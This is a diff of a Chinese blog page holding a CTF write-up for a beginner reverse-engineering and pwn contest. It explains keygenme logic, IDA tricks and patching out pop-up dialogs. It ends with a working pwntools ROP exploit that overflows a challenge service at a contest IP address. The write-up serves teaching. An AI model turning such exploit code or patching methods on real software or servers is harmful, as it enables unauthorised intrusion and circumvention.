@@ -144,7 +144,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ernie"><span class="toc-number">2.</span> <span class="toc-text">Ernie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re100%E5%B0%8F%E9%80%8F%E6%98%8E"><span class="toc-number">3.</span> <span class="toc-text">re100小透明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re100-HelloWorld"><span class="toc-number">4.</span> <span class="toc-text">Re100-HelloWorld</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re50-%E9%80%81%E7%A6%8F%E5%88%A9%E6%8B%89"><span class="toc-number">5.</span> <span class="toc-text">re50-送福利拉</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re200-%E4%BD%A0%E4%BB%AC%E8%A6%81%E7%9A%84%E6%9E%81%E4%B9%90%E5%87%80%E5%9C%9F"><span class="toc-number">6.</span> <span class="toc-text">Re200-你们要的极乐净土</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn200-Rop-rop-rop"><span class="toc-number">7.</span> <span class="toc-text">pwn200-Rop-rop-rop</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ernie"><span class="toc-number">1.</span> <span class="toc-text">Ernie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re100%E5%B0%8F%E9%80%8F%E6%98%8E"><span class="toc-number">2.</span> <span class="toc-text">re100小透明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re100-HelloWorld"><span class="toc-number">3.</span> <span class="toc-text">Re100-HelloWorld</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re50-%E9%80%81%E7%A6%8F%E5%88%A9%E6%8B%89"><span class="toc-number">4.</span> <span class="toc-text">re50-送福利拉</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re200-%E4%BD%A0%E4%BB%AC%E8%A6%81%E7%9A%84%E6%9E%81%E4%B9%90%E5%87%80%E5%9C%9F"><span class="toc-number">5.</span> <span class="toc-text">Re200-你们要的极乐净土</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn200-Rop-rop-rop"><span class="toc-number">6.</span> <span class="toc-text">pwn200-Rop-rop-rop</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -193,67 +193,72 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>   毕竟我不是搞web的，所以本文主要写的内容，主要是写二进制的，但是我也不是搞移动端和安卓的，所以我本篇文章的内容主要是reverse和pwn。<br>​    其次呢，因为笔者能力有限，所以如果有哪个地方写错了，或者写得不好，欢迎大家指出，谢谢。</p>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>   毕竟我不是搞web的，所以本文主要写的内容，主要是写二进制的，但是我也不是搞移动端和安卓的，所以我本篇文章的内容主要是reverse和pwn。<br>​    其次呢，因为笔者能力有限，所以如果有哪个地方写错了，或者写得不好，欢迎大家指出，谢谢。</p>
 <p>比赛地址：<a href="http://geek.sycsec.com/">http://geek.sycsec.com/</a><br>​    还有一点就是，这个比赛是成信三叶草准备招新的题目，所以很多地方都是挺适合入门者学习的，所以大神就别来看了。<br>二进制题目打包[下载</p>
-<p>](<a href="http://pan.baidu.com/s/1nuJ1cDF">http://pan.baidu.com/s/1nuJ1cDF</a>)<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/base.png"></p>
+<p>](<a href="http://pan.baidu.com/s/1nuJ1cDF">http://pan.baidu.com/s/1nuJ1cDF</a>)<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/base.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/base.png"></a></p>
 <h1 id="Ernie"><a href="#Ernie" class="headerlink" title="Ernie"></a>Ernie</h1><p>这个题目挺有意思的<br>主要看的是名字的name的长度，幸运数字，以及Key的值</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-sycgeek-01.jpg"><br>（运行截图）</p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-sycgeek-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-sycgeek-01.jpg"></a><br>（运行截图）</p>
 <p>贴出关键代码</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_1.png"></p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_2.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_1.png"></a></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_2.png"></a></p>
 <p>这个题目逻辑还是挺清晰的，name是6位，key应该是16进制，也就是说2位转化成一个字符给S1，key本来应该是32位，那么S1将是16位</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key3.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key3.png"></a></p>
 <p>而这一段则说明了S1要与这里的红框的字符串相同，字符串是a_6sy2tcy3iy7se，所以输入的key应该就S1的16进制咯，<br>继续往下看</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key4.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key4.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key4.png"></a></p>
 <p>先进入 sub_8048717的函数看一眼</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-8048717.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-8048717.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-8048717.png"></a></p>
 <p>现在已知v6==6，这里不能让j小于0，所以反过来想，j只能为6，如果j小于6那么肯定就会小于0，就不对了。flag出不来了，所以j初始值是大于6的，到6停止，为达到停止条件，v3为6.<br>继续往下看，将s1与v3异或，然后转化成字符串，之后就得到flag了。</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-result.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-result.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-result.png"></a></p>
 <h1 id="re100小透明"><a href="#re100小透明" class="headerlink" title="re100小透明"></a>re100小透明</h1><p>拿到文件  查壳，没有<br>打开程序</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-keygenme.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-keygenme.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-keygenme.png"></a></p>
 <p>这看着像一个keygenme，问题来了帐号和密码是什么呢</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-touming.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-touming.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-touming.png"></a></p>
 <p>这是关键代码，这里的逻辑是username和password的逻辑<br>，满足的逻辑是这样的：</p>
 <p>usrname = ‘xxxxx’<br>buf = [11,70,23,32,32,61,17,44]</p>
 <p>则key满足，ord(userame[i])-buf[i] = ord(key[i])<br>问题是这里我并不知道用户名什么，题目也没要求给，我看到程序的窗口有个Syclover，那么假定这是一个关于Syclover的keygenme的问题，尝试得到这个用户名的key</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_of_xiaotuoming.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_of_xiaotuoming.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_of_xiaotuoming.png"></a></p>
 <p>尝试提交，getflag<br>SYC{H3LLOCTF}</p>
 <h1 id="Re100-HelloWorld"><a href="#Re100-HelloWorld" class="headerlink" title="Re100-HelloWorld"></a>Re100-HelloWorld</h1><p>这题就只是一个字符串比较<br>给新手一个技巧，在IDA中shift+F12可以搜索字符串</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-hello_world.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-hello_world.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-hello_world.png"></a></p>
 <p>可以看到几个关键字符串，不知道为什么please input your name的字符串进去之后找不到关键，我索性单机“please input your PassWord”，<br>这里还有一个技巧，将鼠标放到关键地方，按‘X’键可以查看交叉引用</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-X_of_hello.png"><br>点击OK</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-cmp_hello.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-X_of_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-X_of_hello.png"></a><br>点击OK</p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-cmp_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-cmp_hello.png"></a></p>
 <p>看到了这里有按位进行的字符串比较，但是这里只能看到ascii码不知道，所对应的字符是什么，这里还有一个技巧，是IDA的R键，可以将16进制转成字符</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-resula_of_hello.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-resula_of_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-resula_of_hello.png"></a></p>
 <p>所以最后的结果是 SYC{Hell0_W0rld}</p>
 <h1 id="re50-送福利拉"><a href="#re50-送福利拉" class="headerlink" title="re50-送福利拉"></a>re50-送福利拉</h1><p>这题是一个有多解的题目。。。很尴尬阿<br>打开OD去跟，<br>是一个立即数的比较</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-righti-num.jpg"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-righti-num.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-righti-num.jpg"></a></p>
 <p>找到这个call，F7跟进去</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-re50.jpg"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-re50.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-re50.jpg"></a></p>
 <p>几个比较都是上面的语句，其中ss:[ebp+eax-0x40]，只有eax的值是变化的，eax又是取出我们的输入，所以调整我们的输入，就可以控制byte ptr ss:[ebp+eax-0x40]的值，使跳转条件不成立。这几个比较中，是分别与2、8、9、3、9、8、9、8，然而是栈中有这几个数的地方，就是上面提到的两串立即数。所以要调整输入，使ss:[ebp+eax-0x40]的值分别为2,8,9,3,9,8,9，8的栈地址。<br>所以只要控制我的输入，到和几个立即数相符就好了，我这里得到的是 20161010<br>所以我这的flag是 SYC[20161010]</p>
 <h1 id="Re200-你们要的极乐净土"><a href="#Re200-你们要的极乐净土" class="headerlink" title="Re200-你们要的极乐净土"></a>Re200-你们要的极乐净土</h1><p>听了极乐净土根本停！不！下！来！ 听说只要绕过这些弹出的对话框就可以得到flag了，完全不用逆向哦。 have fun :)  提示：inline hook</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-jljt.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-jljt.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-jljt.png"></a></p>
 <p>这个题目音乐太好好听了，我都舍不得停下来了。恶心的是这弹窗好可怕，还好的是题目说了，弹窗没了，flag就出来了，这不就是咱们经常遇到的去广告，去弹窗的问题吗。<br>用OD加载，<br>以为去窗口我直接，Ctrl+G，找到我要去的API</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-messagebox.png"></p>
-<p>点击确定，<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-breakpoint.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-messagebox.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-messagebox.png"></a></p>
+<p>点击确定，<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-breakpoint.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-breakpoint.png"></a></p>
 <p>在这个地方下段，并且将push ebp改成ret 直接让他返回</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-final_jileshijie.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-final_jileshijie.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-final_jileshijie.png"></a></p>
 <p>F9运行到断点，输入flag，等待几秒钟加密后的flag就出来了所以这里的flag是<br>SYC{F6A9D22C3018693B2FCC1B2D357F7AEAc}</p>
 <h1 id="pwn200-Rop-rop-rop"><a href="#pwn200-Rop-rop-rop" class="headerlink" title="pwn200-Rop-rop-rop"></a>pwn200-Rop-rop-rop</h1><p>听说真正的魔法师都会rop，你是他的粉丝吗？<a href="https://pan.baidu.com/s/1o8Tipw2">https://pan.baidu.com/s/1o8Tipw2</a> nc 222.18.158.228 12341 （pwn的题目有加分哦，此题解出得400分）</p>
 <p>最后是一个pwn的题目，毕竟是给新人做的，这个题目还是满友善的，step都告诉我们了，先用IDA打开。</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/syc-16-overflow.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/syc-16-overflow.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/syc-16-overflow.png"></a></p>
 <p>这里的关键是怎么绕过if ( strlen(p) &gt; 7 )的判断，我选择用<br>\x00进行截断。</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-rop_step.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-rop_step.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-rop_step.png"></a></p>
 <p>题目还给了不少提示，题目的名字和这里都很明显的告诉我们要有三个的rop，那就顺着题目的意思来吧，这里进行构造payload，<br>rop链还要符合step1-3的check</p>
 <p>看一下step3的伪代码</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3.png"></p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3.png"></a></p>
 <p>题目也给我们提供了一个cmd这还是蛮友好的。。。</p>
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3_1111.png"><br>所以最后的exp已经很好写了</p>
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3_1111.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-step3_1111.png"></a><br>所以最后的exp已经很好写了</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;222.18.158.228&quot;</span>,<span class="number">12341</span>)</span><br><span class="line"><span class="comment"># print r.recvuntil(&quot;Input&quot;)</span></span><br><span class="line"></span><br><span class="line">step1Addr = <span class="number">0x0804871e</span></span><br><span class="line">step2Addr = <span class="number">0x08048766</span></span><br><span class="line">step3Addr = <span class="number">0x080487a3</span></span><br><span class="line">mainAddr = <span class="number">0x0804867d</span></span><br><span class="line"></span><br><span class="line">shellcodeBuf = <span class="string">&#x27;a&#x27;</span>*<span class="number">7</span> + chr(<span class="number">0</span>) * <span class="number">9</span></span><br><span class="line"></span><br><span class="line">payload1 = shellcodeBuf + p32(step1Addr) + p32(mainAddr) + p32(<span class="number">0</span>) + p32(<span class="number">0x41414141</span>) + <span class="string">&#x27;\xd5\xc4\xb3\xa2&#x27;</span></span><br><span class="line"></span><br><span class="line">payload2 = shellcodeBuf + p32(step2Addr) + p32(mainAddr) + p32(<span class="number">0xff25a7d4</span>)+ p32(<span class="number">0x41414141</span>)</span><br><span class="line"></span><br><span class="line">payload3 = shellcodeBuf + p32(step3Addr) + p32(mainAddr) + p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xc0c0c0c</span>) + p32(<span class="number">0x9a829a82</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.sendline(payload3)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
 
-<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-attachk.png"></p>
-
+<p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-attachk.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-attachk.png"></a></p>
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
   </div>
 </article>
 
@@ -290,7 +295,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ernie"><span class="toc-number">2.</span> <span class="toc-text">Ernie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re100%E5%B0%8F%E9%80%8F%E6%98%8E"><span class="toc-number">3.</span> <span class="toc-text">re100小透明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re100-HelloWorld"><span class="toc-number">4.</span> <span class="toc-text">Re100-HelloWorld</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re50-%E9%80%81%E7%A6%8F%E5%88%A9%E6%8B%89"><span class="toc-number">5.</span> <span class="toc-text">re50-送福利拉</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re200-%E4%BD%A0%E4%BB%AC%E8%A6%81%E7%9A%84%E6%9E%81%E4%B9%90%E5%87%80%E5%9C%9F"><span class="toc-number">6.</span> <span class="toc-text">Re200-你们要的极乐净土</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn200-Rop-rop-rop"><span class="toc-number">7.</span> <span class="toc-text">pwn200-Rop-rop-rop</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Ernie"><span class="toc-number">1.</span> <span class="toc-text">Ernie</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re100%E5%B0%8F%E9%80%8F%E6%98%8E"><span class="toc-number">2.</span> <span class="toc-text">re100小透明</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re100-HelloWorld"><span class="toc-number">3.</span> <span class="toc-text">Re100-HelloWorld</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re50-%E9%80%81%E7%A6%8F%E5%88%A9%E6%8B%89"><span class="toc-number">4.</span> <span class="toc-text">re50-送福利拉</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re200-%E4%BD%A0%E4%BB%AC%E8%A6%81%E7%9A%84%E6%9E%81%E4%B9%90%E5%87%80%E5%9C%9F"><span class="toc-number">5.</span> <span class="toc-text">Re200-你们要的极乐净土</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn200-Rop-rop-rop"><span class="toc-number">6.</span> <span class="toc-text">pwn200-Rop-rop-rop</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
